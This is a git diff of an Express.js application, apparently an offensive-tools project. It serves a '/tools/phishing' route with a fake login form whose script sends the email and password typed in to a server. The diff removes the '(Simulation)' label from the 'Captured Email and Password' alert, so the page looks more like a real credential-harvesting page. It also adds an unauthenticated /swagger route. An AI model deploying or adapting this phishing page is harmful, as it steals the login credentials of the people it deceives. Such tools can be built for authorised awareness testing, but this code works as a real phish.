@@ -78,7 +78,6 @@ app.get('/tools/phishing', authentication, authorize('phishing'), (req, res) => 
             <button type="submit">Login</button>
         </form>
         <script>
-            // Envoyer les données au serveur avec fetch
             document.querySelector('#form').addEventListener('submit', function(e) {
                 e.preventDefault();
                 const email = document.getElementById('email').value;
@@ -92,7 +91,7 @@ app.get('/tools/phishing', authentication, authorize('phishing'), (req, res) => 
                     body: JSON.stringify({ email, password })
                 }).then(response => {
                     if (response.ok) {
-                        alert('Captured Email and Password (Simulation)');
+                        alert('Captured Email and Password');
                     }
                 }).catch(error => console.error('Error:', error));
             });
@@ -318,6 +317,12 @@ app.post('/logout', authentication, (req, res) => {
     blacklist.push(req.headers.authorization.split(' ')[1]); // Récupère le token Bearer
     res.status(200).json({ message: "Successful disconnection." });
 });
+
+// Swagger
+
+app.get('/swagger', (req, res) => {
+    res.sendFile(path.join(__dirname, 'swagger.json'));
+})
 
 
 
